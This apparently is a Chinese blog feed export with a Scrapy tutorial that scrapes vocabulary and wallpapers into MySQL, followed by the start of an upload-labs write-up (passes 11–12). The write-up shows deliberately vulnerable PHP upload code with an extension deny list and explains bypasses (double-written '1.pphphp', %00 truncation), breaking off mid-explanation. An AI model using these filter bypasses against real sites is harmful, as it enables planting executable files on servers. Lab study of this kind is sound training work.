    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connectDatabase</span>(<span class="hljs-params">self</span>):</span>
        conn = pymysql.connect(host=self.host,
                               port=self.port,
                               user=self.user,
                               passwd=self.passwd,
                               db=self.db,
                               charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)
        <span class="hljs-keyword">return</span> conn

        <span class="hljs-comment"># 创建要使用到的数据库</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createDatabase</span>(<span class="hljs-params">self</span>):</span>
        conn = self.connectMysql()
        sql = <span class="hljs-string">&quot;create database if not exists &quot;</span> + self.db
        cur = conn.cursor()
        cur.execute(sql)  <span class="hljs-comment">#</span>
        cur.close()
        conn.close()

        <span class="hljs-comment"># 创建数据表</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createTable</span>(<span class="hljs-params">self, sql</span>):</span>
        conn = self.connectDatabase()

        cur = conn.cursor()
        cur.execute(sql)
        cur.close()
        conn.close()

        <span class="hljs-comment"># 向数据库中插入数据</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">insert</span>(<span class="hljs-params">self, sql, *params</span>):</span>  <span class="hljs-comment">#</span>
        conn = self.connectDatabase()
        cur = conn.cursor();
        cur.execute(sql, params)
        conn.commit()
        cur.close()
        conn.close()
        <span class="hljs-comment"># 数据库更新操作</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">self, sql, *params</span>):</span>
        conn = self.connectDatabase()
        cur = conn.cursor()
        cur.execute(sql, params)
        conn.commit()
        cur.close()
        conn.close()


    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">self, sql, *params</span>):</span>
        conn = self.connectDatabase()
        cur = conn.cursor()
        cur.execute(sql, params)
        conn.commit()
        cur.close()
        conn.close()

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestDBHelper</span>():</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>
        self.dbHelper = DBHelper()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testCreateDatebase</span>(<span class="hljs-params">self</span>):</span>
        self.dbHelper.createDatabase()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testCreateTable</span>(<span class="hljs-params">self</span>):</span>
        sql = <span class="hljs-string">&quot;create table wordtable(id int primary key auto_increment,word varchar(50),soundmark varchar(100),url varchar(200),translation varchar(100))&quot;</span>
        self.dbHelper.createTable(sql)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testInsert</span>(<span class="hljs-params">self</span>):</span>
        sql = <span class="hljs-string">&quot;insert into wordtable(word,soundmark,url,translation) values(%s,%s,%s,%s)&quot;</span>
        params = (<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>)
        self.dbHelper.insert(sql, *params)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testUpdate</span>(<span class="hljs-params">self</span>):</span>
        sql = <span class="hljs-string">&quot;update testtable set word=%s,soundmark=%s,url=%s,translation=%s where id=%s&quot;</span>
        params = (<span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)
        self.dbHelper.update(sql, *params)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testDelete</span>(<span class="hljs-params">self</span>):</span>
        sql = <span class="hljs-string">&quot;delete from wordtable where id=%s&quot;</span>
        params = (<span class="hljs-string">&quot;1&quot;</span>)
        self.dbHelper.delete(sql, *params)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    testDBHelper = TestDBHelper()
    <span class="hljs-comment"># testDBHelper.testCreateDatebase()</span>
    <span class="hljs-comment"># testDBHelper.testCreateTable()</span>
    <span class="hljs-comment"># testDBHelper.testInsert()</span></code></pre>

<p>在编写爬虫之前先运行一次该程序，就可以在数据库中看到新创建的数据库</p>
<h2 id="爬虫编写"><a href="#爬虫编写" class="headerlink" title="爬虫编写"></a>爬虫编写</h2><h3 id="setting-py"><a href="#setting-py" class="headerlink" title="setting.py"></a>setting.py</h3><pre><code class="hljs python">BOT_NAME = <span class="hljs-string">&#x27;words&#x27;</span>

SPIDER_MODULES = [<span class="hljs-string">&#x27;words.spiders&#x27;</span>]
NEWSPIDER_MODULE = <span class="hljs-string">&#x27;words.spiders&#x27;</span>


<span class="hljs-comment">#Mysql数据库的配置信息</span>
MYSQL_HOST = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>
MYSQL_DBNAME = <span class="hljs-string">&#x27;word&#x27;</span>         <span class="hljs-comment">#数据库名字，请修改</span>
MYSQL_USER = <span class="hljs-string">&#x27;root&#x27;</span>             <span class="hljs-comment">#数据库账号，请修改</span>
MYSQL_PASSWD = <span class="hljs-string">&#x27;root&#x27;</span>         <span class="hljs-comment">#数据库密码，请修改</span>

MYSQL_PORT = <span class="hljs-number">3306</span>               <span class="hljs-comment">#数据库端口，在dbhelper中使用</span>


<span class="hljs-comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span>
<span class="hljs-comment">#USER_AGENT = &#x27;word (+http://www.yourdomain.com)&#x27;</span>
USER_AGENT = <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36&#x27;</span>

LOG_LEVEL = <span class="hljs-string">&quot;WARNING&quot;</span>
ROBOTSTXT_OBEY = <span class="hljs-literal">True</span>

<span class="hljs-comment"># Configure item pipelines</span>
<span class="hljs-comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span>
ITEM_PIPELINES = &#123;
    <span class="hljs-comment"># 两个管道的优先级相同</span>
    <span class="hljs-string">&#x27;words.pipelines.WebcrawlerScrapyPipeline&#x27;</span>: <span class="hljs-number">300</span>, <span class="hljs-comment">#保存到mysql数据库</span>
    <span class="hljs-string">&#x27;words.pipelines.JsonWithEncodingPipeline&#x27;</span>: <span class="hljs-number">300</span>, <span class="hljs-comment">#保存到json文件中</span>
&#125;</code></pre>



<h3 id="items-py"><a href="#items-py" class="headerlink" title="items.py"></a>items.py</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WordsItem</span>(<span class="hljs-params">scrapy.Item</span>):</span>
    <span class="hljs-comment"># define the fields for your item here like:</span>
    <span class="hljs-comment"># name = scrapy.Field()</span>
    word = scrapy.Field()
    soundmark = scrapy.Field()
    url = scrapy.Field()
    translation = scrapy.Field()
</code></pre>



<h3 id="web-word-py"><a href="#web-word-py" class="headerlink" title="web_word.py"></a>web_word.py</h3><p>爬虫文件</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> urllib.request
<span class="hljs-keyword">from</span> scrapy.selector <span class="hljs-keyword">import</span> Selector
<span class="hljs-keyword">from</span> scrapy.http <span class="hljs-keyword">import</span> HtmlResponse,Request
<span class="hljs-keyword">from</span> words.items <span class="hljs-keyword">import</span> WordsItem

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebWordSpider</span>(<span class="hljs-params">scrapy.Spider</span>):</span>
    name = <span class="hljs-string">&#x27;web_word&#x27;</span>
    allowed_domains = [<span class="hljs-string">&#x27;word.iciba.com/&#x27;</span>]

    <span class="hljs-comment"># class 是四级必备单词，这里可以根据需要选择不同的单词表</span>
    first_url = <span class="hljs-string">&quot;http://word.iciba.com/?action=words&amp;class=11&amp;course=&#123;&#125;&quot;</span>
    start_urls = []

    <span class="hljs-comment"># 生成爬取需要的url地址池</span>
    <span class="hljs-comment"># 可以根据需要修改nums，控制爬取的单词数</span>
    nums = <span class="hljs-number">11</span>  <span class="hljs-comment"># 爬取前10页的单词，一共200个单词</span>
    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,nums):
        start_urls.append(first_url.<span class="hljs-built_in">format</span>(page))
    print(start_urls)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span>
        se = Selector(response)
        <span class="hljs-comment"># 先判断页面中是否存在单词</span>
        src = se.xpath(<span class="hljs-string">&quot;//div[@class=&#x27;word_main&#x27;]/ul/li&quot;</span>)
        <span class="hljs-comment"># 提取出url中的页数</span>
        page = re.findall(<span class="hljs-string">r&quot;course=\d+&quot;</span>, response.url)[<span class="hljs-number">0</span>]
        print(<span class="hljs-string">&quot;===&quot;</span> * <span class="hljs-number">10</span> + <span class="hljs-string">&quot;正在爬取第&quot;</span>+page[<span class="hljs-number">7</span>:]+<span class="hljs-string">&quot;页&quot;</span>+<span class="hljs-string">&quot;===&quot;</span> * <span class="hljs-number">10</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(src) &gt; <span class="hljs-number">0</span>:
            <span class="hljs-comment"># 将单词的信息提取出来，word是一个数组，存放的是页面中的所有单词</span>
            word = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_w&#x27;]/span/@title&quot;</span> ).extract()  <span class="hljs-comment"># 提取节点信息</span>
            soundmark = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_y&#x27;]/strong/text()&quot;</span> ).extract()
            url = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_y&#x27;]/a/@id&quot;</span> ).extract()
            translation = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_s&#x27;]/span/@title&quot;</span> ).extract()

            <span class="hljs-comment"># 因为上一步提出的音标存在制表符，这里就用正则提取出正确的音标</span>
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(word)):
                sm = re.findall(<span class="hljs-string">r&quot;\[.*?\]&quot;</span>,soundmark[i])
                soundmark[i] = sm[<span class="hljs-number">0</span>]

            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(word)):
                file_name = <span class="hljs-string">u&quot;%s.mp3&quot;</span> % word[i]         <span class="hljs-comment"># 用单词给mp3文件命名</span>
                path = os.path.join(<span class="hljs-string">&quot;D:\Sunzh\word\cet4&quot;</span>, file_name)  <span class="hljs-comment"># mp3保存的路径</span>
                urllib.request.urlretrieve(url[i], path)    <span class="hljs-comment"># 下载该mp3文件</span>
                item = WordsItem()
                item[<span class="hljs-string">&#x27;word&#x27;</span>] = word[i]
                item[<span class="hljs-string">&#x27;soundmark&#x27;</span>] = soundmark[i]
                item[<span class="hljs-string">&#x27;url&#x27;</span>] = url[i]
                item[<span class="hljs-string">&#x27;translation&#x27;</span>] = translation[i]
                <span class="hljs-comment"># print(item)</span>
                <span class="hljs-comment"># 将item发给管道处理，在管道中写入数据库和josn文件</span>
                <span class="hljs-keyword">yield</span> item
</code></pre>

<p>这里是使用xpath获取的节点元素，很简单。</p>
<p>可以在浏览器中下载一个插件<code>XPath Helper</code>，辅助写出xpath路径，它可以将所匹配的元素高亮显示，保证程序中的xpath正确性。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502220632784.png" alt="image-20210502220632784"></p>
<h3 id="pipelines-py"><a href="#pipelines-py" class="headerlink" title="pipelines.py"></a>pipelines.py</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> pymysql.cursors
<span class="hljs-keyword">import</span> codecs
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> logging <span class="hljs-keyword">import</span> log
<span class="hljs-keyword">from</span> twisted.enterprise <span class="hljs-keyword">import</span> adbapi

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JsonWithEncodingPipeline</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>
    <span class="hljs-string">&#x27;&#x27;&#x27;保存到文件中对应的class</span>
<span class="hljs-string">       1、在settings.py文件中配置</span>
<span class="hljs-string">       2、在自己实现的爬虫类中yield item,会自动执行</span>
<span class="hljs-string">    &#x27;&#x27;&#x27;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>
        self.file = codecs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;word.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment"># 保存为json文件</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_item</span>(<span class="hljs-params">self, item, spider</span>):</span>
        line = json.dumps(<span class="hljs-built_in">dict</span>(item)) + <span class="hljs-string">&quot;\n&quot;</span>  <span class="hljs-comment"># 转为json的</span>
        self.file.write(line)                 <span class="hljs-comment"># 写入文件中</span>
        <span class="hljs-keyword">return</span> item

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spider_closed</span>(<span class="hljs-params">self, spider</span>):</span>  <span class="hljs-comment"># 爬虫结束时关闭文件</span>
        self.file.close()

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebcrawlerScrapyPipeline</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>
    <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">       保存到数据库中对应的class</span>
<span class="hljs-string">       1、在settings.py文件中配置</span>
<span class="hljs-string">       2、在自己实现的爬虫类中yield item,会自动执行</span>
<span class="hljs-string">    &#x27;&#x27;&#x27;</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, dbpool</span>):</span>
        self.dbpool = dbpool  <span class="hljs-comment"># 定义一个数据库连接对象</span>
        <span class="hljs-string">&#x27;&#x27;&#x27; 这里注释中采用写死在代码中的方式连接线程池，可以从settings配置文件中读取，更加灵活</span>
<span class="hljs-string">            self.dbpool=adbapi.ConnectionPool(&#x27;MySQLdb&#x27;,</span>
<span class="hljs-string">                                          host=&#x27;127.0.0.1&#x27;,</span>
<span class="hljs-string">                                          db=&#x27;crawlpicturesdb&#x27;,</span>
<span class="hljs-string">                                          user=&#x27;root&#x27;,</span>
<span class="hljs-string">                                          passwd=&#x27;123456&#x27;,</span>
<span class="hljs-string">                                          cursorclass=MySQLdb.cursors.DictCursor,</span>
<span class="hljs-string">                                          charset=&#x27;utf8&#x27;,</span>
<span class="hljs-string">                                          use_unicode=False)</span>
<span class="hljs-string">        &#x27;&#x27;&#x27;</span>
<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_settings</span>(<span class="hljs-params">cls, settings</span>):</span>
        <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">           1、@classmethod声明一个类方法，而对于平常我们见到的则叫做实例方法。</span>
<span class="hljs-string">           2、类方法的第一个参数cls（class的缩写，指这个类本身），而实例方法的第一个参数是self，表示该类的一个实例</span>
<span class="hljs-string">           3、可以通过类来调用，就像C.f()，相当于java中的静态方法</span>
<span class="hljs-string">        &#x27;&#x27;&#x27;</span>
        dbparams = <span class="hljs-built_in">dict</span>(
            host=settings[<span class="hljs-string">&#x27;MYSQL_HOST&#x27;</span>],  <span class="hljs-comment"># 读取settings中的配置</span>
            db=settings[<span class="hljs-string">&#x27;MYSQL_DBNAME&#x27;</span>],
            user=settings[<span class="hljs-string">&#x27;MYSQL_USER&#x27;</span>],
            passwd=settings[<span class="hljs-string">&#x27;MYSQL_PASSWD&#x27;</span>],
            charset=<span class="hljs-string">&#x27;utf8&#x27;</span>,               <span class="hljs-comment"># 编码要加上，否则可能出现中文乱码问题</span>
            cursorclass=pymysql.cursors.DictCursor,
            use_unicode=<span class="hljs-literal">False</span>,
        )
        dbpool = adbapi.ConnectionPool(<span class="hljs-string">&#x27;pymysql&#x27;</span>, **dbparams)  <span class="hljs-comment"># **表示将字典扩展为关键字参数,相当于host=xxx,db=yyy....</span>
        <span class="hljs-keyword">return</span> cls(dbpool)                                     <span class="hljs-comment"># 相当于dbpool付给了这个类，self中可以得到</span>

    <span class="hljs-comment"># pipeline默认调用</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_item</span>(<span class="hljs-params">self, item, spider</span>):</span>
        query = self.dbpool.runInteraction(self._conditional_insert, item)  <span class="hljs-comment"># 调用插入的方法</span>
        query.addErrback(self._handle_error, item, spider)                  <span class="hljs-comment"># 调用异常处理方法</span>
        <span class="hljs-keyword">return</span> item

    <span class="hljs-comment"># 写入数据库中</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_conditional_insert</span>(<span class="hljs-params">self, tx, item</span>):</span>
        <span class="hljs-comment"># print (item[&#x27;word&#x27;])</span>
        sql = <span class="hljs-string">&quot;insert into wordtable(word,soundmark,url,translation) values(%s,%s,%s,%s)&quot;</span>
        params = (item[<span class="hljs-string">&quot;word&quot;</span>], item[<span class="hljs-string">&quot;soundmark&quot;</span>], item[<span class="hljs-string">&quot;url&quot;</span>], item[<span class="hljs-string">&quot;translation&quot;</span>])
        tx.execute(sql, params)

    <span class="hljs-comment"># 错误处理方法</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_handle_error</span>(<span class="hljs-params">self, failue, item, spider</span>):</span>
        print(<span class="hljs-string">&#x27;--------------database operation exception!!-----------------&#x27;</span>)
        print(<span class="hljs-string">&#x27;-------------------------------------------------------------&#x27;</span>)
        print(failue)</code></pre>

<p>pipelines中写了两个方法，分别是将单词的相关性信息写入到数据库，另一个是将单词信息保存到一个json文件中</p>
<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>运行截图</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221134698.png" alt="image-20210502221134698"></p>
<p>json文件截图</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221223747.png" alt="image-20210502221223747"></p>
<p>下载的音频</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221344459.png" alt="image-20210502221344459" style="zoom:67%;">

<p>数据库内容</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502221904968.png" alt="image-20210502221904968"></p>
<h1 id="爬取壁纸的爬虫"><a href="#爬取壁纸的爬虫" class="headerlink" title="爬取壁纸的爬虫"></a>爬取壁纸的爬虫</h1><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy
<span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> urllib.request

<span class="hljs-keyword">from</span> word.items <span class="hljs-keyword">import</span> WordItem
<span class="hljs-keyword">from</span> scrapy.selector <span class="hljs-keyword">import</span> Selector
<span class="hljs-keyword">from</span> scrapy.http <span class="hljs-keyword">import</span> HtmlResponse,Request


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpiderPicSpider</span>(<span class="hljs-params">scrapy.Spider</span>):</span>
    name = <span class="hljs-string">&#x27;spider_pic&#x27;</span>
    allowed_domains = [<span class="hljs-string">&#x27;desk.zol.com.cn&#x27;</span>] <span class="hljs-comment"># 爬虫搜索的域名范围</span>
    first_url = <span class="hljs-string">&quot;http://desk.zol.com.cn/meinv/1920x1080/&#123;0&#125;.html&quot;</span>
    start_urls = [first_url.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)] <span class="hljs-comment"># 爬虫开始的url</span>


    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):
            url = self.first_url.<span class="hljs-built_in">format</span>(i)

            <span class="hljs-keyword">yield</span> Request(
                url=url,
                callback=self.parse_one
            )

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_one</span>(<span class="hljs-params">self, response</span>):</span>
        se = Selector(response)  <span class="hljs-comment"># 创建查询对象</span>
        <span class="hljs-keyword">if</span> (re.match(<span class="hljs-string">&quot;https://desk.zol.com.cn/meinv/\d+x\d+/\d+.html&quot;</span>, response.url)):
            <span class="hljs-comment"># 正则是判断改url是否正确</span>
            src = se.xpath(<span class="hljs-string">&quot;//ul[@class=&#x27;pic-list2  clearfix&#x27;]/li&quot;</span>)  <span class="hljs-comment"># 使用xpath找到所有图片所在的节点</span>
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(src)):
                imgURLs = se.xpath(<span class="hljs-string">&quot;//ul[@class=&#x27;pic-list2  clearfix&#x27;]/li[%d]/a/img/@src&quot;</span> % i).extract()  <span class="hljs-comment"># 提取节点信息</span>
                title = se.xpath(<span class="hljs-string">&quot;//ul[@class=&#x27;pic-list2  clearfix&#x27;]/li[%d]/a/img/@title&quot;</span> % i).extract()

                <span class="hljs-keyword">if</span> imgURLs:
                    <span class="hljs-comment"># 替换url中的尺寸信息 可以下载更大的图片</span>
                    realURL = imgURLs[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;t_s208x130c5&quot;</span>, <span class="hljs-string">&quot;t_s2560x1600c5&quot;</span>)
                    file_name = <span class="hljs-string">u&quot;%s.jpg&quot;</span> % title[<span class="hljs-number">0</span>]

                    path = os.path.join(<span class="hljs-string">&quot;D:\Sunzh\pic\meinv&quot;</span>, file_name)  <span class="hljs-comment"># 拼接图片的路径</span>
                    <span class="hljs-built_in">type</span> = sys.getfilesystemencoding()
                    print(file_name.encode(<span class="hljs-built_in">type</span>))
                    item = WordItem()
                    item[<span class="hljs-string">&#x27;name&#x27;</span>] = file_name
                    item[<span class="hljs-string">&#x27;url&#x27;</span>] = realURL
                    <span class="hljs-comment"># print(item[&#x27;name&#x27;],item[&#x27;url&#x27;])</span>

                    <span class="hljs-keyword">yield</span> item
                    urllib.request.urlretrieve(realURL, path)  <span class="hljs-comment"># 接收文件路径和需要保存的路径，会自动去文件路径下载并保存到我们指定的本地路径</span></code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502223115320.png" alt="image-20210502223115320"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502223132992.png" alt="image-20210502223132992"></p>
]]></content>
  </entry>
  <entry>
    <title>upload-11-21</title>
    <url>/2020/09/18/upload2/</url>
    <content><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><span id="more"></span>

<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);

        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        
        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>


<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
<p>可以双写绕过，即<code>1.pphphp</code></p>
<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);
    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;

        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;
    &#125;
&#125;</code></pre>

<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
<p>这里用的<code>%00截断</code>，原理如下</p>
<p><code>www.xxx.com/qq.jpg</code></p>
